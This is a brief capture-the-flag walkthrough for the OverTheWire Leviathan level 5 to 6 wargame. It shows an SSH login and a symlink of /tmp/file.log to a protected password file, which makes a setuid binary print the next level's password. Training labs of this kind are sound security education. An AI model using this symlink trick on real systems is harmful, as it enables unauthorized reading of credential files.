## Level 5 to 6


To Login:
```bash
sshpass -p $(cat leviathan5) ssh -p 2223 leviathan5@leviathan.labs.overthewire.org
```

Listing out will find a setuid ELF *leviathan5* executing it you will learn that it reads the file */tmp/file.log*. So, logic is to Symlink the */tmp/file.log* to */etc/leviathan_pass/leviathan6* to read the password.

```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```
Execute leviathan5
```bash
./leviathan5
```

Save the password to file *leviathan6*

At last ```exit``` and ```logout```